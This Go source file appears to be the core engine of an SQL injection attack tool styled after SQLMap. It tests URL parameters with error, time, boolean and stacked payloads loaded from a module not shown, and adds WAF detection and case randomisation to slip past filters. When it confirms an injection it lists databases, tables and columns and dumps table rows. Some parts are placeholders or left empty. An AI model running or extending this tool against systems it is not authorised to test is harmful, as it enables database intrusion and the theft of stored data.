package core

import (
	"fmt"
	"hackit/sqli/go/modules"
	"hackit/sqli/go/payloads"
	"net/url"
	"strings"
	"sync"
	"time"
)

type Result struct {
	Parameter string `json:"parameter"`
	Type      string `json:"type"`
	Payload   string `json:"payload"`
	DBMS      string `json:"dbms"`
	Details   string `json:"details"`
}

func (e *Engine) RandomizeCase(s string) string {
	result := ""
	for _, char := range s {
		if strings.Contains("abcdefghijklmnopqrstuvwxyz", strings.ToLower(string(char))) {
			if time.Now().UnixNano()%2 == 0 {
				result += strings.ToUpper(string(char))
			} else {
				result += strings.ToLower(string(char))
			}
		} else {
			result += string(char)
		}
	}
	return result
}

func (e *Engine) Start() []Result {
	results := []Result{}
	u, err := url.Parse(e.Opts.URL)
	if err != nil {
		return results
	}

	params := u.Query()
	if len(params) == 0 && e.Opts.Data == "" {
		return results
	}

	// Baseline request
	baseBody, baseLen, baseHeaders, err := e.Request("", "")
	if err != nil {
		return results
	}

	// Detect WAF & DB initially
	waf := modules.DetectWAF(baseHeaders, baseBody)
	if waf.Detected {
		e.Log.Warning(fmt.Sprintf("WAF Detected: %s", waf.Name))
	}

	// Extra technology info extraction
	server := baseHeaders.Get("Server")
	poweredBy := baseHeaders.Get("X-Powered-By")
	e.Log.Info("Analyzing target technology stack...")
	if server != "" {
		e.Log.Info(fmt.Sprintf("Web server: %s", server))
	}
	if poweredBy != "" {
		e.Log.Info(fmt.Sprintf("Web application technology: %s", poweredBy))
	}

	initialDB := modules.FingerprintDBMS(baseBody, baseHeaders)
	if initialDB != "Unknown" {
		e.Log.Info(fmt.Sprintf("Initial DBMS fingerprint: %s", initialDB))
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	sem := make(chan struct{}, e.Opts.Threads)

	// Scan URL params
	for param := range params {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			// Test all DBMS payloads
			for _, group := range payloads.AllPayloads {
				// If we already detected a DB, prioritize its payloads
				if initialDB != "Unknown" && initialDB != group.DBMS && !strings.Contains(initialDB, group.DBMS) {
					// Skip other DBs if we are sure about the fingerprint
					// unless aggressiveness is high
					if e.Opts.RiskLevel < 3 {
						continue
					}
				}

				for _, pay := range group.Payloads {
					// Skip individual payload logging unless very high verbose
					if e.Opts.Verbose >= 3 {
						e.Log.Debug(fmt.Sprintf("Testing %s payload: %s", group.DBMS, pay.Content))
					}

					// Apply aggressiveness check
					if pay.Type == "deep" && e.Opts.RiskLevel < 4 {
						continue
					}
					// Apply delay if specified
					if e.Opts.Delay > 0 {
						time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
					}

					// Apply basic tampering if needed
					processedPayload := e.ApplyTamper(pay.Content)
					if e.Opts.RandomCase {
						processedPayload = e.RandomizeCase(processedPayload)
					}

					start := time.Now()
					body, bodyLen, _, err := e.Request(processedPayload, p)
					if err != nil {
						continue
					}
					elapsed := time.Since(start)

					isVulnerable := false
					details := ""

					switch pay.Type {
					case "error":
						if e.CheckError(body, group.DBMS) {
							isVulnerable = true
							details = fmt.Sprintf("Error pattern for %s detected", group.DBMS)
						}
					case "time":
						// Adaptive Timing: Compare with base + margin
						margin := 500 * time.Millisecond
						if elapsed >= (5*time.Second + margin) {
							isVulnerable = true
							details = fmt.Sprintf("Time-based injection confirmed (Elapsed: %v)", elapsed)
						}
					case "boolean":
						if bodyLen != baseLen {
							isVulnerable = true
							details = "Response length change detected"
						}
					case "stacked":
						// Stacked queries: check for time delay or side effects
						if elapsed >= 5*time.Second || bodyLen != baseLen {
							isVulnerable = true
							details = "Stacked query execution suspected"
						}
					case "deep":
						if bodyLen != baseLen || e.CheckError(body, group.DBMS) {
							isVulnerable = true
							details = fmt.Sprintf("Deep exploitation successful: %s metadata leaked", group.DBMS)
						}
					}

					if isVulnerable {
						mu.Lock()
						results = append(results, Result{
							Parameter: p,
							Type:      pay.Type,
							Payload:   processedPayload,
							DBMS:      group.DBMS,
							Details:   details,
						})
						mu.Unlock()

						if e.Opts.Verbose >= 1 {
							e.Log.Success(fmt.Sprintf("Parameter '%s' is vulnerable to %s (%s)", p, pay.Type, group.DBMS))
						}
						// If found vulnerable, we can stop testing other payloads for this parameter to be faster,
						// but SQLMap usually continues to find all types.
						// However, the user wants "fast", so we could break here if we found a "good" injection.
					}
				}
			}
		}(param)
	}

	wg.Wait()

	// Post-scan: Enumeration if flags are set
	if len(results) > 0 {
		bestResult := results[0] // Pick the first finding as the primary injection point

		// Print successful injection summary
		e.Log.Success(fmt.Sprintf("Parameter '%s' is vulnerable to %s (%s)", bestResult.Parameter, bestResult.Type, bestResult.DBMS))

		// Display Technology Info like SQLMap
		e.Log.Info(fmt.Sprintf("the back-end DBMS is %s", bestResult.DBMS))

		server := baseHeaders.Get("Server")
		poweredBy := baseHeaders.Get("X-Powered-By")
		if server != "" {
			// Simple OS detection from Server header
			os := "Linux"
			if strings.Contains(strings.ToLower(server), "win") {
				os = "Windows"
			}
			e.Log.Raw(fmt.Sprintf(" web server operating system: %s", os))
			e.Log.Raw(fmt.Sprintf(" web application technology: %s", server))
		}
		if poweredBy != "" {
			e.Log.Raw(fmt.Sprintf(" back-end technology: %s", poweredBy))
		}
		e.Log.Raw(fmt.Sprintf(" back-end DBMS: %s", bestResult.DBMS))
		fmt.Println() // Add spacing

		e.Log.Info(fmt.Sprintf("Using parameter '%s' for enumeration", bestResult.Parameter))
		enum := modules.NewEnumerator(e)

		var dbs []string
		if e.Opts.ListDBs || e.Opts.DumpAll {
			var err error
			dbs, err = enum.ListDatabases(bestResult.Parameter, bestResult.DBMS)
			if err == nil {
				e.Log.Success(fmt.Sprintf("Available databases: %s", strings.Join(dbs, ", ")))
				results = append(results, Result{
					Parameter: "enumeration",
					Type:      "list-dbs",
					Payload:   strings.Join(dbs, ","),
					DBMS:      bestResult.DBMS,
				})
			} else {
				e.Log.Warning("Could not list all databases, falling back to current database")
				dbs = []string{"current_database"}
			}
		}

		if e.Opts.ListTables || e.Opts.DumpAll {
			if len(dbs) == 0 {
				dbs = []string{"current_database"}
			}
			for _, db := range dbs {
				// Skip system DBs for MySQL to avoid cluttering dump-all
				if bestResult.DBMS == "MySQL" && (db == "information_schema" || db == "performance_schema" || db == "mysql" || db == "sys") {
					continue
				}

				tables, err := enum.ListTables(db, bestResult.Parameter, bestResult.DBMS)
				if err == nil {
					e.Log.Success(fmt.Sprintf("Tables in %s: %s", db, strings.Join(tables, ", ")))
					results = append(results, Result{
						Parameter: "enumeration",
						Type:      "list-tables",
						Details:   db,
						Payload:   strings.Join(tables, ","),
						DBMS:      bestResult.DBMS,
					})

					if e.Opts.DumpAll {
						extractor := modules.NewExtractor(e)
						for _, table := range tables {
							e.Log.Info(fmt.Sprintf("Dumping table: %s.%s", db, table))

							// Get columns first for better formatting
							columns, colErr := enum.ListColumns(db, table, bestResult.Parameter, bestResult.DBMS)
							colStr := ""
							if colErr == nil {
								colStr = strings.Join(columns, ",")
								e.Log.Info(fmt.Sprintf("Columns in %s: %s", table, colStr))
							}

							data, err := extractor.DumpTable(db, table, bestResult.Parameter, bestResult.DBMS)
							if err == nil && len(data) > 0 {
								e.Log.Success(fmt.Sprintf("Successfully dumped %d rows from %s.%s", len(data), db, table))
								// Add result for Python to handle (optional, Python can also read from logs/files)
								results = append(results, Result{
									Parameter: "enumeration",
									Type:      "dump-table",
									Details:   fmt.Sprintf("%s.%s", db, table),
									Payload:   fmt.Sprintf("Columns: %s | Rows: %d", colStr, len(data)),
									DBMS:      bestResult.DBMS,
								})
							}
						}
					}
				}
			}
		}

		if e.Opts.ListColumns && !e.Opts.DumpAll {
			// If specific table/db provided in opts, use those.
			// Otherwise, this part is a bit tricky without user interaction.
			// For now, let's assume if ListColumns is set, we use the first table found if any.
		}
	} else {
		e.Log.Warning("No vulnerabilities found to exploit.")
	}

	return results
}

func (e *Engine) CheckError(body string, dbms string) bool {
	// Simple placeholder for error pattern checking
	errorPatterns := []string{
		"SQL syntax",
		"mysql_fetch",
		"PostgreSQL",
		"ORA-",
	}
	for _, p := range errorPatterns {
		if strings.Contains(body, p) {
			return true
		}
	}
	return false
}
